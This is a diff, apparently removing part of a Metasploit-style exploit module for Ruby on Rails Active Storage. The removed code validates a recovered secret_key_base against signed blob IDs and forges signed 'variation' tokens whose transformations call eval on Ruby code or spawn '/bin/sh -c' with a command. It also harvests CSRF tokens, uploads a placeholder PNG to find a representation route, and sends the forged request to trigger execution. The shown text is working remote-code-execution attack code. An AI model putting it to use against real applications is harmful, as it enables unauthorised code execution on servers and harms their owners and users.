-  end
-
-  def extract_secret_key_base_from_plaintext(plaintext)
-    document = safe_load_yaml_document(unwrap_marshaled_string(plaintext), aliases: false)
-    return nil unless document.is_a?(Hash)
-
-    secret = document['secret_key_base']
-    return nil unless secret.is_a?(String) && secret.present?
-
-    validate_secret_key_base(secret)
-  end
-
-  # ActiveSupport::EncryptedFile may wrap the YAML in a Marshal string. Decode
-  # only that primitive envelope; never Marshal.load target-controlled bytes.
-  def unwrap_marshaled_string(data)
-    return data unless data.start_with?("\x04\x08".b)
-
-    offset = 2
-    offset += 1 if data.getbyte(offset) == 0x49
-    return data unless data.getbyte(offset) == 0x22
-
-    length, offset = parse_marshaled_length(data, offset + 1)
-    return data if length.nil?
-
-    value = data.byteslice(offset, length)
-    value&.bytesize == length ? value : data
-  end
-
-  def parse_marshaled_length(data, offset)
-    encoded = data.getbyte(offset)
-    return [nil, offset] unless encoded
-
-    encoded -= 256 if encoded > 127
-    offset += 1
-    return [0, offset] if encoded.zero?
-    return [encoded - 5, offset] if encoded > 4
-    return [nil, offset] if encoded.negative?
-
-    bytes = data.byteslice(offset, encoded)
-    return [nil, offset] unless bytes&.bytesize == encoded
-
-    length = bytes.bytes.each_with_index.sum { |byte, index| byte << (8 * index) }
-    [length, offset + encoded]
-  end
-
-  def derive_verifier_key(secret_key_base, digest)
-    OpenSSL::PKCS5.pbkdf2_hmac(
-      secret_key_base,
-      'ActiveStorage',
-      1000,
-      64,
-      OpenSSL::Digest.new(digest.upcase)
-    )
-  end
-
-  def key_generator_digest_for(secret_key_base, token_info)
-    candidates = if datastore['KEY_GENERATOR_DIGEST'] == 'auto'
-                   KEY_GENERATOR_DIGESTS
-                 else
-                   [datastore['KEY_GENERATOR_DIGEST']]
-                 end
-    digest = candidates.find do |candidate|
-      verifier_signature(
-        derive_verifier_key(secret_key_base, candidate),
-        token_info[:encoded],
-        token_info[:verifier_digest]
-      ) == token_info[:signature]
-    end
-    raise TriggerError, 'SECRET_KEY_BASE did not validate against the signed blob ID with the selected key generator and verifier digests' unless digest
-
-    print_status("Validated #{digest.upcase} key derivation against a signed blob ID")
-    digest
-  end
-
-  def signed_token_info(token)
-    encoded, separator, signature = token.to_s.rpartition('--')
-    unless separator.present? && encoded.present? && signature.match?(/\A[0-9a-f]+\z/i) && signature.length.even?
-      raise FlowError, 'Active Storage returned an invalid signed token'
-    end
-
-    {
-      encoded: encoded,
-      signature: signature,
-      verifier_digest: verifier_digest_for(signature),
-      message_serializer: message_serializer_for(encoded)
-    }
-  end
-
-  def verifier_digest_for(signature)
-    configured = datastore['VERIFIER_DIGEST']
-    return configured unless configured == 'auto'
-
-    digest = VERIFIER_DIGESTS[signature.length]
-    raise TriggerError, 'Could not determine the Active Support verifier digest from the signed blob ID; set VERIFIER_DIGEST manually' unless digest
-
-    print_status("Detected #{digest.upcase} Active Support verifier signatures")
-    digest
-  end
-
-  def message_serializer_for(encoded)
-    configured = datastore['MESSAGE_SERIALIZER']
-    return configured.to_sym unless configured == 'auto'
-
-    serializer = detect_message_serializer(decode_signed_message(encoded))
-    raise TriggerError, 'Could not determine the Active Support message serializer from the signed blob ID; set MESSAGE_SERIALIZER manually' unless serializer
-
-    if serializer == :message_pack
-      print_status('Detected the Active Support MessagePack signed-message format; using its JSON-compatible fallback')
-      return :json
-    end
-
-    print_status("Detected the Active Support #{serializer} message serializer")
-    serializer
-  end
-
-  def decode_signed_message(encoded)
-    Base64.strict_decode64(encoded)
-  rescue ArgumentError
-    begin
-      Base64.urlsafe_decode64(encoded)
-    rescue ArgumentError => e
-      raise FlowError, "Active Storage returned invalid signed-message Base64: #{e.message}"
-    end
-  end
-
-  def detect_message_serializer(serialized)
-    return :marshal if serialized.start_with?("\x04\x08".b)
-    return :message_pack if serialized.start_with?("\xcc\x80".b)
-    return unless serialized.start_with?('{')
-
-    document = JSON.parse(serialized)
-    metadata = document['_rails']
-    return :json unless metadata.is_a?(Hash) && metadata.key?('message')
-
-    inner = Base64.strict_decode64(metadata['message'].to_s)
-    inner.start_with?("\x04\x08".b) ? :marshal : :json
-  rescue JSON::ParserError, ArgumentError
-    nil
-  end
-
-  def variation_transformations
-    case target['Type']
-    when :ruby
-      ruby_transformations(payload.encoded)
-    else
-      command_transformations(payload.encoded)
-    end
-  end
-
-  def command_transformations(command)
-    {
-      'send' => ['spawn', '/bin/sh', '-c', command]
-    }
-  end
-
-  # ImageProcessing::Chainable#apply invokes the builder's inherited send method
-  # while constructing the pipeline, so send('eval', ruby) reaches Kernel#eval
-  # and runs the payload directly in the Rails worker. The apply step then
-  # returns a non-builder value, so the representation request ends in an error
-  # after the payload has already executed.
-  def ruby_transformations(ruby)
-    {
-      'send' => ['eval', ruby]
-    }
-  end
-
-  def variation_payload(transformations, serializer)
-    message = if serializer == :marshal
-                Marshal.dump(transformations)
-              else
-                transformations.to_json
-              end
-    {
-      _rails: {
-        message: Base64.strict_encode64(message),
-        exp: nil,
-        pur: 'variation'
-      }
-    }.to_json
-  end
-
-  def forged_variation(verifier_key, serialized, verifier_digest)
-    encoded = Base64.strict_encode64(serialized)
-    "#{encoded}--#{verifier_signature(verifier_key, encoded, verifier_digest)}"
-  end
-
-  def verifier_signature(verifier_key, encoded, verifier_digest)
-    OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(verifier_digest.upcase), verifier_key, encoded)
-  end
-
-  def csrf_token
-    return datastore['CSRF_TOKEN'] if datastore['CSRF_TOKEN'].present?
-
-    landing_page[:csrf]
-  end
-
-  def landing_page
-    return @landing_page if @landing_page
-
-    res = send_request_cgi(target_request('GET', app_uri(datastore['LANDINGURI'])))
-    raise UnreachableError, 'No response from the landing page' unless res
-    raise FlowError, "Landing page returned HTTP #{res.code}" unless res.code == 200
-
-    doc = res.get_html_document
-    csrf_meta = doc.at_css('meta[name="csrf-token"]')&.[]('content')
-    csrf_form = doc.at_css('input[name="authenticity_token"]')&.[]('value')
-    csrf = csrf_meta.presence || csrf_form
-    raise FlowError, 'Landing page did not contain a CSRF token' if csrf.blank? && datastore['CSRF_TOKEN'].blank?
-
-    @landing_page = {
-      csrf: csrf,
-      csrf_meta: csrf_meta,
-      csrf_form: csrf_form,
-      representation_paths: representation_paths(doc)
-    }
-  end
-
-  def representation_paths(doc)
-    paths = doc.css('img[src]').map { |node| node['src'] }
-    srcset_paths = doc.css('img[srcset]').flat_map do |node|
-      node['srcset'].to_s.split(',').map { |entry| entry.strip.split(/\s+/, 2).first }
-    end
-    (paths + srcset_paths).compact.select { |path| representation_path?(path) }.uniq
-  end
-
-  def representation_path?(path)
-    representation_route_index(URI.parse(path).path.split('/'))
-    true
-  rescue FlowError, URI::Error
-    false
-  end
-
-  def base_representation_path
-    return @base_representation_path if @base_representation_path
-
-    if datastore['VARIATION_KEY'].present?
-      raise FlowError, 'VARIATION_KEY is handled through standard Active Storage representation routes'
-    end
-
-    if datastore['REPRESENTATIONURI'].present?
-      @base_representation_path = select_representation_path([datastore['REPRESENTATIONURI']], 'REPRESENTATIONURI')
-      print_status('Using the operator-supplied Active Storage representation URL')
-      return @base_representation_path
-    end
-
-    landing = landing_page
-    if landing[:representation_paths].any?
-      @base_representation_path = select_representation_path(landing[:representation_paths], 'landing page')
-      print_status('Reusing an Active Storage representation URL found on the landing page')
-      return @base_representation_path
-    end
-
-    signed_id = direct_upload(
-      csrf_token: csrf_token,
-      filename: 'safe.png',
-      content_type: 'image/png',
-      content: safe_png
-    )
-    @base_representation_path = submit_safe_upload(landing[:csrf_form].presence || csrf_token, signed_id)
-  end
-
-  def select_representation_path(paths, source)
-    index = datastore['REPRESENTATION_INDEX']
-    raise FlowError, "#{source} did not contain a representation path" if paths.empty?
-    raise FlowError, "#{source} did not contain representation index #{index}" unless paths[index]
-
-    parsed = URI.parse(paths[index])
-    representation_route_index(parsed.path.split('/'))
-    paths[index]
-  rescue URI::Error => e
-    raise FlowError, "#{source} returned an invalid representation path: #{e.message}"
-  end
-
-  def direct_upload(csrf_token:, filename:, content_type:, content:)
-    checksum = Base64.strict_encode64(Digest::MD5.digest(content))
-    body = {
-      blob: {
-        filename: filename,
-        byte_size: content.bytesize,
-        checksum: checksum,
-        content_type: content_type
-      }
-    }.to_json
-
-    res = send_request_cgi(
-      target_request(
-        'POST',
-        app_uri(datastore['DIRECTUPLOADURI']),
-        'ctype' => 'application/json',
-        'headers' => {
-          'Accept' => 'application/json',
-          'X-CSRF-Token' => csrf_token
-        },
-        'data' => body
-      )
-    )
-    raise UnreachableError, 'No response while creating the direct upload' unless res
-    raise FlowError, "Direct upload create returned HTTP #{res.code}" unless res.code == 200
-
-    json = res.get_json_document
-    raise FlowError, 'Direct upload response was not a JSON object' unless json.is_a?(Hash)
-
-    signed_id = json['signed_id']
-    direct = json['direct_upload']
-    raise FlowError, 'Direct upload response did not include a signed_id' if signed_id.blank?
-    raise FlowError, 'Direct upload response did not include upload metadata' unless direct.is_a?(Hash)
-
-    upload_url = direct['url']
-    upload_headers = direct['headers']
-    raise FlowError, 'Direct upload response did not include an upload URL' if upload_url.blank?
-    raise FlowError, 'Direct upload response did not include upload headers' unless upload_headers.is_a?(Hash)
-
-    @active_storage_service = report_active_storage_service
-
-    upload_res = send_request_to_url(upload_url, method: 'PUT', data: content, headers: upload_headers)
-    raise UnreachableError, 'No response while uploading the blob content' unless upload_res
-    unless [200, 201, 204].include?(upload_res.code)
-      raise FlowError, "Direct object upload returned HTTP #{upload_res.code}"
-    end
-
-    signed_id
-  end
-
-  def submit_safe_upload(csrf_token, signed_id)
-    current_uri = URI.parse(full_uri(app_uri(datastore['SUBMITURI'])))
-    res = send_request_cgi(
-      target_request(
-        'POST',
-        app_uri(datastore['SUBMITURI']),
-        'vars_post' => {
-          'authenticity_token' => csrf_token,
-          datastore['ATTACHMENT_FIELD'] => signed_id
-        },
-        'headers' => { 'Accept' => 'text/html' }
-      )
-    )
-    raise UnreachableError, 'No response while submitting the safe upload' unless res
-
-    redirect_count = 0
-    while res.redirect?
-      unless [301, 302, 303].include?(res.code) && res.redirection.present?
-        raise FlowError, "Safe upload submit returned unsupported HTTP #{res.code} redirect"
-      end
-      raise FlowError, 'Safe upload response exceeded the redirect limit' if redirect_count == REPRESENTATION_REDIRECT_LIMIT
-
-      current_uri = URI.join(current_uri.to_s, res.redirection.to_s)
-      validate_http_url!(current_uri, 'Safe upload redirect')
-      res = send_request_cgi(
-        target_request(
-          'GET',
-          request_uri(current_uri.to_s),
-          'headers' => { 'Accept' => 'text/html' }
-        )
-      )
-      raise UnreachableError, 'No response while following the safe upload redirect' unless res
-
-      redirect_count += 1
-    end
-    raise FlowError, "Safe upload response returned HTTP #{res.code}" unless res.code == 200
-
-    select_representation_path(representation_paths(res.get_html_document), 'safe upload response')
-  rescue URI::Error => e
-    raise FlowError, "Safe upload redirect was invalid: #{e.message}"
-  end
-
-  def safe_png
-    signature = "\x89PNG\r\n\x1a\n".b
-    ihdr = [8, 8, 8, 0, 0, 0, 0].pack('NNC5')
-    raw = (("\x00" + ("\x00" * 8)) * 8).b
-    signature + png_chunk('IHDR', ihdr) + png_chunk('IDAT', Zlib::Deflate.deflate(raw)) + png_chunk('IEND', ''.b)
-  end
-
-  def png_chunk(type, data)
-    [data.bytesize].pack('N') + type + data + [Zlib.crc32(type + data)].pack('N')
-  end
-
-  def target_request(method, uri, options = {})
-    cookie = [datastore['COOKIE'], cookie_jar.cookies.join('; ')].compact.reject(&:blank?).join('; ')
-    request = {
-      'method' => method,
-      'uri' => uri,
-      'keep_cookies' => true
-    }.merge(options)
-    request['cookie'] = cookie if cookie.present?
-    request
-  end
-
-  def send_request_to_url(url, method:, data:, headers:)
-    parsed = URI.parse(url)
-    validate_http_url!(parsed, 'Direct upload URL')
-    validate_external_storage_url!(parsed, 'Direct upload URL') unless same_target_url?(parsed)
-
-    uri = parsed.path.presence || '/'
-    uri += "?#{parsed.query}" if parsed.query
-    request_headers = sanitize_upload_headers(headers).merge('Connection' => 'close')
-
-    if same_target_url?(parsed)
-      return send_request_cgi(
-        target_request(
-          method,
-          uri,
-          'data' => data,
-          'headers' => request_headers
-        )
-      )
-    end
-
-    send_sanitized_request(
-      'method' => method,
-      'uri' => uri,
-      'data' => data,
-      'headers' => request_headers,
-      'cookie' => '',
-      'rhost' => parsed.hostname,
-      'rport' => parsed.port,
-      'SSL' => parsed.scheme == 'https',
-      'vhost' => parsed.hostname
-    )
-  rescue URI::Error => e
-    raise FlowError, "Direct upload URL was invalid: #{e.message}"
-  end
-
-  def request_representation(path)
-    current = URI.parse(path)
-    if current.hostname
-      request_uri(current.to_s)
-    else
-      current = URI.parse(full_uri(request_uri(current.to_s)))
-    end
-    external = !same_target_url?(current)
-
-    (REPRESENTATION_REDIRECT_LIMIT + 1).times do |redirect_index|
-      validate_http_url!(current, 'Representation URL')
-      validate_external_storage_url!(current, 'Representation URL') unless same_target_url?(current)
-      uri = current.path.presence || '/'
-      uri += "?#{current.query}" if current.query
-      res = if !external && same_target_url?(current)
-              send_request_cgi(target_request('GET', uri))
-            else
-              send_sanitized_request(
-                'method' => 'GET',
-                'uri' => uri,
-                'headers' => { 'Accept' => 'image/png', 'Connection' => 'close' },
-                'rhost' => current.hostname,
-                'rport' => current.port,
-                'SSL' => current.scheme == 'https',
-                'vhost' => current.hostname
-              )
-            end
-      validate_representation_response_size!(res)
-      return res unless res&.redirect? && res.redirection
-      raise FlowError, 'Representation response exceeded the redirect limit' if redirect_index == REPRESENTATION_REDIRECT_LIMIT
-
-      current = URI.join(current.to_s, res.redirection.to_s)
-      external ||= !same_target_url?(current)
-    end
-  rescue URI::Error => e
-    raise FlowError, "Representation redirect was invalid: #{e.message}"
-  end
-
-  def send_sanitized_request(options)
-    logger = Rex::Proto::Http::HttpLoggerSubscriber.new(logger: self)
-    client = Rex::Proto::Http::Client.new(
-      options['rhost'],
-      options['rport'],
-      { 'Msf' => framework, 'MsfExploit' => self },
-      options['SSL'],
-      ssl_version,
-      proxies,
-      '',
-      '',
-      kerberos_authenticator: nil,
-      subscriber: logger,
-      sslkeylogfile: sslkeylogfile
-    )
-    client.set_config(
-      'vhost' => options['vhost'],
-      'ssl_server_name_indication' => options['vhost'],
-      'agent' => datastore['UserAgent'],
-      'raw_headers' => ''
-    )
-    request = client.request_cgi(
-      options.merge(
-        'cookie' => nil,
-        'raw_headers' => '',
-        'authorization' => nil,
-        'username' => '',
-        'password' => '',
-        'preferred_auth' => 'None',
-        kerberos_authenticator: false
-      )
-    )
-    client._send_recv(request, sanitized_request_timeout)
-  rescue ::EOFError, ::Errno::EPIPE, ::Errno::ETIMEDOUT, ::OpenSSL::SSL::SSLError, ::Timeout::Error, Rex::ConnectionError => e
-    vprint_error("External request failed: #{e}")
-    nil
-  ensure
-    client&.close
-  end
-
-  def validate_http_url!(parsed, label)
-    unless %w[http https].include?(parsed.scheme) && parsed.hostname
-      raise FlowError, "#{label} was not an HTTP(S) URL"
-    end
-    raise FlowError, "#{label} contained credentials" if parsed.user || parsed.password
-    raise FlowError, "#{label} contained a fragment" if parsed.fragment
-  end
-
-  def validate_external_storage_url!(parsed, label)
-    return if external_storage_origins.include?(parsed.origin.downcase)
-
-    raise ConfigError, "#{label} used untrusted external origin #{parsed.origin}; add that exact origin to ExternalStorageOrigins only if it is an expected storage service"
-  end
-
-  def external_storage_origins
-    datastore['ExternalStorageOrigins'].to_s.split(',').filter_map do |origin|
-      origin = origin.strip
-      next if origin.empty?
-
-      parsed = URI.parse(origin)
-      unless %w[http https].include?(parsed.scheme) && parsed.hostname && parsed.user.nil? && parsed.password.nil? && parsed.query.nil? && parsed.fragment.nil? && ['', '/'].include?(parsed.path)
-        raise ConfigError, "ExternalStorageOrigins contained an invalid origin: #{origin}"
-      end
-
-      parsed.origin.downcase
-    rescue URI::Error => e
-      raise ConfigError, "ExternalStorageOrigins contained an invalid origin #{origin.inspect}: #{e.message}"
-    end.uniq
-  end
-
-  def sanitize_upload_headers(headers)
-    raise FlowError, 'Direct upload headers were not a JSON object' unless headers.is_a?(Hash)
-    raise FlowError, "Direct upload response contained more than #{MAX_UPLOAD_HEADERS} headers" if headers.length > MAX_UPLOAD_HEADERS
-
-    total_bytes = 0
-    seen_names = {}
-    headers.each_with_object({}) do |(name, value), sanitized|
-      unless name.is_a?(String) && name.match?(/\A[!#$%&'*+\-.^_`|~0-9A-Za-z]+\z/)
-        raise FlowError, 'Direct upload response contained an invalid header name'
-      end
-
-      normalized_name = name.downcase
-      raise FlowError, "Direct upload response contained duplicate #{name} headers" if seen_names[normalized_name]
-
-      raise FlowError, "Direct upload response contained unsafe #{name} header" if UNSAFE_UPLOAD_HEADERS.include?(normalized_name)
-
-      seen_names[normalized_name] = true
-      next if value.nil?
-
-      raise FlowError, "Direct upload header #{name} was not a string" unless value.is_a?(String)
-      raise FlowError, "Direct upload header #{name} exceeded #{MAX_UPLOAD_HEADER_VALUE_BYTES} bytes" if value.bytesize > MAX_UPLOAD_HEADER_VALUE_BYTES
-      if value.b.match?(/[\x00-\x08\x0a-\x1f\x7f]/n)
-        raise FlowError, "Direct upload header #{name} contained a control character"
-      end
-
-      total_bytes += name.bytesize + value.bytesize
-      raise FlowError, "Direct upload headers exceeded #{MAX_UPLOAD_HEADER_BYTES} bytes" if total_bytes > MAX_UPLOAD_HEADER_BYTES
-
-      sanitized[name] = value
-    end
-  end
-
-  def validate_representation_response_size!(res)
-    return unless res
-    return if res.body.to_s.bytesize <= PngDecoder::MAX_DATA_BYTES
-
-    raise FlowError, "Representation response exceeded #{PngDecoder::MAX_DATA_BYTES} bytes"
-  end
-
-  def sanitized_request_timeout
-    configured_timeout = datastore['HttpClientTimeout']
-    configured_timeout&.positive? ? configured_timeout : 20
-  end
-
-  def same_target_url?(parsed)
-    target_hosts = [rhost, vhost].compact.reject(&:blank?).map(&:downcase)
-    target_hosts.include?(parsed.hostname.downcase) && parsed.port == rport && (parsed.scheme == 'https') == ssl
-  end
-
-  def substitute_representation_blob(path, signed_blob_id, filename)
-    parsed = URI.parse(path)
-    parts = parsed.path.split('/')
-    route_index = representation_route_index(parts)
-    parts[route_index + 1] = URI.encode_www_form_component(signed_blob_id)
-    parts[-1] = filename
-    parsed.path = parts.join('/')
-    parsed.to_s
-  rescue URI::Error => e
-    raise FlowError, "Application returned an invalid representation path: #{e.message}"
-  end
-
-  def substitute_variation_key(path, variation)
-    parsed = URI.parse(path)
-    parts = parsed.path.split('/')
-    route_index = representation_route_index(parts)
-    parts[route_index + 2] = URI.encode_www_form_component(variation)
-    parsed.path = parts.join('/')
-    parsed.to_s
-  rescue URI::Error => e
-    raise FlowError, "Application returned an invalid representation path: #{e.message}"
-  end
-
-  def standard_representation_path(signed_id, variation, filename, route: :redirect)
-    direct_upload_path = URI.parse(app_uri(datastore['DIRECTUPLOADURI'])).path
-    suffix = '/direct_uploads'
-    unless direct_upload_path.end_with?(suffix)
-      raise ConfigError, 'DIRECTUPLOADURI must end in /direct_uploads when constructing a standard representation route'
-    end
-
-    prefix = direct_upload_path.delete_suffix(suffix)
-    unless %i[redirect legacy].include?(route)
-      raise ConfigError, "Unsupported Active Storage representation route #{route}"
-    end
-
-    parts = [prefix, 'representations']
-    parts << 'redirect' if route == :redirect
-    parts.concat(
-      [
-        URI.encode_www_form_component(signed_id),
-        URI.encode_www_form_component(variation),
-        filename
-      ]
-    )
-    normalize_uri(*parts)
-  rescue URI::Error => e
-    raise ConfigError, "DIRECTUPLOADURI was invalid: #{e.message}"
-  end
-
-  def representation_route_index(parts)
-    representations_indexes = parts.each_index.select { |index| parts[index] == 'representations' }
-    raise FlowError, 'Representation path did not contain /representations/' if representations_indexes.empty?
-
-    route_index = nil
-    representations_indexes.reverse_each do |representations_index|
-      candidate = if %w[redirect proxy].include?(parts[representations_index + 1])
-                    representations_index + 1
-                  else
-                    representations_index
-                  end
-      if candidate + 3 < parts.length
-        route_index = candidate
-        break
-      end
-    end
-    raise FlowError, 'Representation path was shorter than expected' unless route_index
-
-    route_index
-  end
-
-  def request_uri(path_or_url)
-    parsed = URI.parse(path_or_url)
-    if parsed.hostname
-      target_hosts = [rhost, vhost].compact.reject(&:blank?).map(&:downcase)
-      expected_ssl = parsed.scheme == 'https'
-      unless target_hosts.include?(parsed.hostname.downcase) && parsed.port == rport && expected_ssl == ssl
-        raise FlowError, "Application returned a representation URL on a different origin: #{parsed}"
-      end
-    end
-
-    uri = parsed.path.presence || '/'
-    uri += "?#{parsed.query}" if parsed.query
-    uri
-  rescue URI::Error => e
-    raise FlowError, "Application returned an invalid URL: #{e.message}"
-  end
-
-  def trigger_variation(path)
-    # The forged operation executes while Rails builds the transformation
-    # pipeline and normally ends in an HTTP 500 or a payload-held connection.
-    res = send_request_cgi(target_request('GET', request_uri(path)), 10)
-    unless res
-      vprint_status('No HTTP response while triggering the forged variation')
-      return
-    end
-
-    if res.code.between?(300, 499)
-      raise TriggerError, "Forged variation was rejected with HTTP #{res.code}"
-    end
-
-    vprint_status("Forged variation returned HTTP #{res.code}")
-  end
 end
